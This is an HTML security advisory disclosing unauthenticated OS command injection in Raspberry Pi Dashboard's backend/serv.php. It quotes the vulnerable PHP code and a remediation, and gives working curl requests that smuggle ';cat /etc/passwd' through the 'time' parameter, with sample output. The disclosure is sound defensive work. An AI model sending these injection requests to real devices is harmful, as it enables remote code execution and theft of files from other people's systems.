@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CVE-XXXX-XXXXX | OS Command Injection in Raspberry Pi Dashboard | Lennart Hostettler</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="OS Command Injection / Remote Code Execution in Raspberry Pi Dashboard v0.1–v1.1.6. Discovered by Lennart Hostettler.">
+    <meta name="robots" content="index, follow">
+
+    <meta property="og:title" content="CVE-XXXX-XXXXX | OS Command Injection in Raspberry Pi Dashboard">
+    <meta property="og:description" content="OS Command Injection / Remote Code Execution in Raspberry Pi Dashboard v0.1–v1.1.6. Discovered by Lennart Hostettler.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://hostettler.pro/posts/rpi-dashboard-rce.html">
+    <meta property="og:image" content="https://hostettler.pro/preview-image.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="CVE-XXXX-XXXXX | OS Command Injection in Raspberry Pi Dashboard">
+    <meta name="twitter:description" content="OS Command Injection / Remote Code Execution in Raspberry Pi Dashboard v0.1–v1.1.6. Discovered by Lennart Hostettler.">
+    <meta name="twitter:image" content="https://hostettler.pro/preview-image.jpg">
+
+    <link rel="canonical" href="https://hostettler.pro/posts/rpi-dashboard-rce.html">
+    <link rel="icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <style>
+        #menu ul {
+            list-style: none;
+
+            margin: 1em 0 0 0;
+            display: flex;
+            gap: 1.5em;
+        }
+        #menu a {
+            color: #00ff00;
+            font-weight: bold;
+            border-bottom: 2px solid;
+            transition: border-color 0.2s;
+        }
+        .meta-table {
+            border-collapse: collapse;
+            width: 100%;
+            margin: 1em 0 2em 0;
+        }
+        .meta-table td {
+            padding: 0.4em 0.8em;
+            border: 1px solid #33FF33;
+        }
+        .meta-table td:first-child {
+            color: #00FF00;
+            font-weight: bold;
+            white-space: nowrap;
+            width: 1%;
+        }
+        .severity-critical {
+            color: #ff0000;
+            font-weight: bold;
+        }
+        .back-link {
+            display: inline-block;
+            margin-bottom: 2em;
+            color: #00FF00;
+            font-weight: bold;
+        }
+        pre code.hljs { background: #001a00; padding: 0; }
+        pre {
+            background-color: #001a00;
+            border: 1px solid #33FF33;
+            padding: 1em;
+            overflow-x: auto;
+            line-height: 1.4;
+        }
+        .post-date {
+            color: #33FF33;
+            font-size: 0.9em;
+            margin-bottom: 0.5em;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1 id="heading">lennart.hostettler@debian:~/posts</h1>
+        <nav id="menu">
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/publications.html">Publications</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <a href="/publications.html" class="back-link">&lt;-- Back to Publications</a>
+
+        <p class="post-date">12/06/2026 &mdash; Security Advisory</p>
+        <h2>CVE-XXXX-XXXXX &mdash; OS Command Injection / RCE in Raspberry Pi Dashboard</h2>
+
+        <table class="meta-table">
+            <tr><td>Product</td><td>Raspberry Pi Dashboard</td></tr>
+            <tr><td>Version</td><td>v0.1 &ndash; v1.1.6 (all releases)</td></tr>
+            <tr><td>File</td><td><code>backend/serv.php</code> (lines 76&ndash;93)</td></tr>
+            <tr><td>CVE</td><td>CVE-XXXX-XXXXX (pending)</td></tr>
+            <tr><td>CWE</td><td>CWE-78 &mdash; Improper Neutralization of Special Elements used in an OS Command</td></tr>
+            <tr><td>Auth Required</td><td>No (default state) / Yes (if password configured)</td></tr>
+            <tr><td>Discovered by</td><td>Lennart Hostettler</td></tr>
+        </table>
+
+        <h2>Description</h2>
+        <p>
+            The main request handler in <code>backend/serv.php</code> (lines 76&ndash;98) passes the user-supplied
+            <code>time</code> parameter directly into a <code>system()</code> call without sanitization, allowing
+            arbitrary OS command injection.
+        </p>
+        <pre><code class="language-php">// backend/serv.php, lines 76–93
+if(isset($_REQUEST["p"])){
+  $pass = md5($_REQUEST["p"]);
+  $time = $_REQUEST["time"];          // [1] unsanitized user input
+  if (strpos($time, ':') == false) {
+    $time = "+" . $time;              // [2] only prepends "+", no sanitization
+  }
+  // ...
+  system('sudo /sbin/shutdown -h ' . $time);  // [3] injection point
+  system("sudo /sbin/shutdown -r "  . $time); // [3] injection point
+  echo json_encode(getShutdownEventsInfo());  // [4] called post-injection
+}</code></pre>
+        <p>
+            The only transformation applied to <code>$time</code> is a conditional <code>+</code> prefix.
+            Shell metacharacters such as <code>;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>$()</code>,
+            and backticks are never filtered, allowing injection regardless of the prefix logic.
+        </p>
+
+        <h2>Authentication</h2>
+
+        <h4>&gt; Default state (no password set)</h4>
+        <p>
+            If no password has been configured during setup, the vulnerability is fully unauthenticated:
+        </p>
+        <pre><code class="language-bash">curl -s "http://&lt;host&gt;/backend/serv.php?a=2&time=lennart1337;cat+/etc/passwd"
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...</code></pre>
+
+        <h4>&gt; Setup completed (custom password configured)</h4>
+        <pre><code class="language-bash">curl -v "http://&lt;host&gt;/backend/serv.php?p=&lt;password&gt;&a=2&time=lennart1337;cat+/etc/passwd"
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...</code></pre>
+
+        <h2>Vulnerability History</h2>
+        <p>
+            The injection has been present since the first commit (<code>45094ce</code>, v0.1, 2020-06-16) and
+            remains unpatched through v1.1.6. In the original version the password was hardcoded as plaintext
+            <code>"root"</code> directly in the source code, making exploitation trivially unauthenticated:
+        </p>
+        <pre><code class="language-php">// v0.1 — backend/serv.php
+$pass = $_REQUEST["p"];
+if($pass != "root"){
+    echo "wrongCredentials";
+}else{
+    system("sudo /sbin/shutdown -r +" . $time); // no sanitization
+}</code></pre>
+
+        <h2>Impact</h2>
+        <p>
+            An attacker achieves Remote Code Execution as <code>www-data</code>. On a typical Raspberry Pi
+            deployment this allows:
+        </p>
+        <ul>
+            <li>Reading local files (config files, SSH keys, etc.)</li>
+            <li>Establishing a reverse shell</li>
+            <li>Lateral movement within the local network</li>
+        </ul>
+
+        <h2>Remediation</h2>
+        <p>Sanitize <code>$time</code> using <code>escapeshellarg()</code> before passing it to <code>system()</code>:</p>
+        <pre><code class="language-php">system('sudo /sbin/shutdown -h ' . escapeshellarg($time));
+system("sudo /sbin/shutdown -r "  . escapeshellarg($time));</code></pre>
+    </main>
+
+    <footer>
+        <p>Contact: <a href="mailto:lennart.hostettler@proton.me">💌 lennart.hostettler@proton.me</a></p>
+    </footer>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</body>
+</html>
